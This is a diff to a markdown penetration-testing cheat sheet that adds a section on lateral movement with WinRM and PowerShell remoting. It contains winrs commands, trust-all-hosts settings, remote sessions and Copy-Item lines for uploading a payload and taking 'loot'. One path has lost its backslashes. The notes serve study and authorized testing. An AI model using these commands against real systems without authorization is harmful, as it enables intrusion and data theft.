@@ -355,18 +355,51 @@ execute -j
 
 #### PowerShell Remoting and WinRM
 
-Helpful resources for WinRM and PS remoting:
-
-* [A look under the hood at PowerShell Remoting through a cross platform lens](http://www.hurryupandwait.io/blog/a-look-under-the-hood-at-powershell-remoting-through-a-ruby-cross-plaform-lens)
-* [TODO](TODO)
+Helpful resources for WinRM and PS remoting can be found in [a look under the hood at PowerShell Remoting through a cross platform lens](http://www.hurryupandwait.io/blog/a-look-under-the-hood-at-powershell-remoting-through-a-ruby-cross-plaform-lens).
 
 Using raw WinRM to run commands on other machines:
 
 ```bat
+:: Specify protocol and port.
 winrs.exe -r:http://10.10.10.10:5985 -u:MyUsername -p:MyPassword whoami
+
+:: Or just specify the hostname.
+winrs.exe -r:MyName.MyDomain -u:MyUsername -p:MyPassword whoami
 ```
 
-TODO
+Using PowerShell remoting to gain interactive sessions on remote machines (useful discussion can be found [here](https://www.ired.team/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement) and [here](https://adamtheautomator.com/psremoting/)):
+
+```powershell
+# May need to enable remoting and add our attack machine as a trusted host.
+Enable-PSRemoting -Force
+# The below will make everything a trusted host; after this changed is applied, the
+# WinRM service must be restarted.
+Set-Item wsman:localhostclienttrustedhosts *
+Restart-Service WinRM
+
+# Check for WinRM listeners on a box you want to connect to (from that box).
+winrm e winrm/config/listener
+
+# Check if a remote session is listening and accessible on the default WinRM
+# port (from your attack machine).
+Test-NetConnection 10.10.10.10 -CommonTCPPort WINRM
+
+# Enter a new PowerShell remoting session.
+Enter-PSSession 10.10.10.10
+
+# Enter a new session with specified credentials/authentication mechanism.
+$cred = Get-Credential
+Enter-PSSession 10.10.10.10 -Credential $cred
+Enter-PSSession 10.10.10.10 -Credential MyDomain\MyUsername
+Enter-PSSession 10.10.10.10 -Authentication Kerberos
+
+# Show sessions.
+Get-PSSession
+
+# Upload/download files to/from remote session.
+Copy-Item -Path \temp\payload.exe -Destination \temp -ToSession $sess
+Copy-Item -Path C:\Users\Dummy\Desktop\juicy.txt -Destination \loot -FromSession $sess
+```
 
 #### WMI
 
